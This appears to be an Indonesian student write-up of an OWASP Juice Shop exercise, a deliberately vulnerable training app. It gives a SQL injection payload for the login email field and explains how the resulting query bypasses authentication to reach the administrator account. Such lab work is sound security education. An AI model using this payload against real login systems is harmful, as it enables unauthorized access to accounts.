# Injection - Soal 1 (Login Admin)

## 1. Soal
Login sebagai administrator tanpa menggunakan kredensial normal.

---

## 2. Link Resource
- [OWASP Juice Shop](https://owasp-juice.shop)
- [SQL Injection Cheat Sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## 3. Jawaban + Bukti

### Step-by-step
1. Buka halaman login di Juice Shop.  
   <img width="1310" height="1062" alt="step 1" src="https://github.com/user-attachments/assets/17cd2ccd-9b58-47c8-be62-b29388d75268" />


2. Coba masukkan payload SQL Injection di field **Email** dengan format berikut:
   ```sql
   admin@juice-sh.op' OR '1'='1' --
dan isi password sembarang, misalnya 123.
<img width="1915" height="1050" alt="step 3" src="https://github.com/user-attachments/assets/2c306d05-5090-4def-8987-afc355afc459" />




3. Klik tombol Log in. Query SQL yang dijalankan server akan berubah menjadi:

sql
Salin kode
SELECT * FROM Users 
WHERE email = 'admin@juice-sh.op' OR '1'='1' --' 
AND password = '123';
Karena kondisi '1'='1' selalu TRUE, validasi login berhasil dilewati.
<img width="1918" height="1076" alt="berhasil" src="https://github.com/user-attachments/assets/259d1eb3-8bf0-40e0-827a-6b730f593c69" />


Hasilnya, sistem memberikan akses sebagai Administrator.